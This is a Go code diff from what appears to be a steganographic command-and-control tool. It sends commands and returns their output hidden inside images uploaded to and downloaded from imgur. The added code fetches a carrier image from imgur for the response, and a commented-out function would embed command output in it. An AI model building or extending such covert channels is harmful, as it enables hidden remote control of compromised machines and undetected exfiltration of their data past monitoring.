@@ -5,7 +5,9 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"image"
 	"image/png"
+	"io/ioutil"
 	"log"
 	"mime/multipart"
 	"net/http"
@@ -39,6 +41,17 @@ func CreateImage(command string, origPic string, newPic string) {
 	outFile.Close()
 
 }
+
+/*
+func EncodeResponse(output []uint8, imageMem string) {
+	w := new(bytes.Buffer)
+	err := stego.Encode(w, imageMem, []byte(output))
+	if err != nil {
+		fmt.Printf("Error encoding file %v", err)
+	}
+
+}
+*/
 
 // UploadImage is a function that will upload an image to the public gallery of imgur
 func UploadImage(imageFile string, title string, album string, description string, clientID string) (imageID, deleteHash interface{}) {
@@ -152,6 +165,29 @@ func DecodeImage(memContents []uint8) (message string) {
 	//fmt.Println(string(msg))
 	message = string(msg)
 	return message
+}
+
+// GrabRandomImage is a function that will download an image to upload the repsonse
+func GrabRandomImage() (imageMem image.Image) {
+	// https://i.imgur.com/XXqLLR8.jpg
+	// https://i.imgur.com/HtG8aqc.png
+	// https://i.imgur.com/Ncwhhllh.jpg
+	url := "https://i.imgur.com/Ncwhhllh.jpg"
+	response, err := http.Get(url)
+	if err != nil {
+		fmt.Println("What: ", err)
+	}
+	defer response.Body.Close()
+
+	contents, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		fmt.Println(err)
+	}
+	//fmt.Println(string(contents))
+	imageMem, _, _ = image.Decode(bytes.NewReader(contents))
+	//fmt.Println(imageMem)
+	return imageMem
+
 }
 
 // GetResponse is a function for the tasking module to retrieve response
